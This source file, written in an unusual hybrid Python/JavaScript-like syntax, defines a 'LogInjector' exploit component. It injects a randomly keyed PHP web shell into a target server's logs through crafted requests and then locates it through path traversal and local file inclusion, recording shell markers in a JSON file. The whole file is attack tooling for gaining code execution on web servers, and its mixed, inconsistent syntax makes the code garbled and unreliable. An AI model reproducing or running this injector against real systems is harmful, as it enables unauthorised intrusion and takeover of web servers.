_f('urlparse');

class init ExploitComponent LogInjector {
    repo = JsonRepository('logShells.json'),
    
    __init__: @(
        reqTmpl,
        dot = '.',
        separator = '/',
        terminator = '') {
        
        self.probe = TraversalProbe(
            'blank command',
            reqTmpl,
            dot,
            separator,
            terminator);
            
        self.emitter = PhpShellEmitter();
        self.url = reqTmpl.url;
    },

    findShell: @() {
        self.log('[i] Searching for shell');
        s = self.probe.scan(self.key);        
        
        if (s != null) {
            self.log('[+] Shell found');
            
            if (__emit('self.url in self.repo.repo')) {
                tags = self.repo.repo[self.url];
                self.emitter.prefix = tags[0];
                self.emitter.suffix = tags[1];
            } else {
                self.log('[-] Error: could not find shell prefix/suffix');
            }
        }
        else self.log('[-] Shell not found');
        
        ret s;
    },

    sendShell: @{
        self.log('[i] Injecting shell');
        
        self.key =
            range(0, randint(6, 15))
            @select(@(x) self.emitter.emitter.getRandChar())
            addAll;
        
        self.log('[i] Using key: %s' % self.key);
        shell = self.emitter.emit(pad = true, key = self.key);
        
        u = self.url.__contains__('$lfi') ?
            self.reqTmpl.getUrl({ lfi: shell}) :
            self.url + '?' + shell;
        
        self.repo.add(
            self.url, 
            [self.emitter.prefix, self.emitter.suffix]);
            
        self.log('    Url: ' + u);
        urllib2.urlopen(u);
    },

    inject: @{
        self.sendShell();
        shell = self.findShell();
        
        ret shell;
    },
};
